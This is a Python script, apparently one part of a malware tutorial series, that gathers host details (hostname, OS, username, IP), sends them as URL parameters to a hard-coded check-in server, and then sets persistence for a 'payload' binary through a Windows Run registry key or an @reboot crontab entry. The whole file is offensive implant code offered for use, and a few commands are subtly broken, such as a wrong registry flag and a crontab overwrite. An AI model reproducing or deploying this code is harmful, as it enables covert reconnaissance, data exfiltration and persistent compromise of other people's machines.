import socket
import platform
import os
import requests
import subprocess
import sys

# ========================================================
# CONFIGURATION
SERVER_IP = '10.0.0.1' 
ENDPOINT = 'checkin' 
# ========================================================

def get_host_info():
    # (Function remains the same, collects host data)
    info = {}
    info['hostname'] = socket.gethostname()
    info['os'] = platform.system()
    info['os_release'] = platform.release()
    info['os_version'] = platform.version()
    info['user'] = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USERNAME', 'N/A')
    info['processor'] = platform.processor()
    info['local_ip'] = socket.gethostbyname(socket.gethostname())
    return info

def set_persistence(data):
    """
    Registers the payload to run automatically upon system startup.
    """
    os_type = data['os']
    print(f"\n[+] Attempting to achieve persistence on {os_type}...")

    if os_type == 'Windows':
        # ----------------------------------------------------
        # WINDOWS PERSISTENCE (Registry Run Key)
        # This places the payload into the 'Run' key for the current user.
        # NOTE: You MUST replace 'payload.exe' with the actual name of your compiled binary.
        # ----------------------------------------------------
        payload_name = "payload.exe" 
        
        try:
            # Command to add a new entry to the HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
            cmd = f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "PayloadCheckin" /t REG_SZ /p "{payload_name}" /f'
            
            subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print("✅ WINDOWS Persistence SUCCESS! Added to HKCU Run Key.")
            
        except subprocess.CalledProcessError as e:
            print(f"❌ WINDOWS Persistence FAILURE! Registry Command failed.")
            print(f"Error: {e.stderr.decode()}")
        except Exception as e:
            print(f"❌ WINDOWS Persistence FAILURE! General Error: {e}")

    elif os_type in ['Linux', 'Darwin']: # Darwin is macOS
        # ----------------------------------------------------
        # LINUX/MAC PERSISTENCE (Crontab)
        # We add an entry to the user's crontab to run the payload every boot/login.
        # NOTE: Replace 'payload' with the actual binary name.
        # ----------------------------------------------------
        payload_name = "payload" # Assuming the binary is named 'payload'
        
        # Command to append the execution command to the user's crontab
        # The '@reboot' directive ensures it runs after a system boot.
        cmd = f"echo '@reboot /path/to/payload' | crontab -u $(whoami) - "
        
        try:
            # Execute the command
            subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print("✅ LINUX/MAC Persistence SUCCESS! Added to crontab (@reboot).")
        except subprocess.CalledProcessError as e:
            print(f"❌ LINUX/MAC Persistence FAILURE! Crontab Command failed.")
            print(f"Error: {e.stderr.decode()}")
        except Exception as e:
            print(f"❌ LINUX/MAC Persistence FAILURE! General Error: {e}")


def send_data(data):
    """
    Sends the collected data to the HTTP server.
    """
    # ... (The sending logic remains the same as in Part 1) ...
    params = []
    for key, value in data.items():
        params.append(f"{key}={value}")
        
    query_string = "&".join(params)
    target_url = f"http://{SERVER_IP}/{ENDPOINT}?{query_string}"
    
    print(f"\n[+] Target URL: {target_url}")
    
    try:
        response = requests.get(target_url, timeout=10)
        
        if response.status_code == 200:
            print("-" * 40)
            print(f"✅ SUCCESS: Data successfully sent!")
            print("-" * 40)
        else:
            print(f"❌ FAILURE: Failed to send data. Status Code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print("\n" + "=" * 40)
        print(f"🚨 CRITICAL ERROR: Could not connect to server. Persistence may fail.")
        print(f"Error details: {e}")
        print("=" * 40)


if __name__ == "__main__":
    host_data = get_host_info()
    
    print("\n--- Collected Host Data ---")
    for k, v in host_data.items():
        print(f"{k.upper():<10}: {v}")
    print("---------------------------\n")
    
    # 1. Send the data
    send_data(host_data)
    
    # 2. Achieve Persistence
    set_persistence(host_data)

    print("\n[*** Execution Complete ***]")
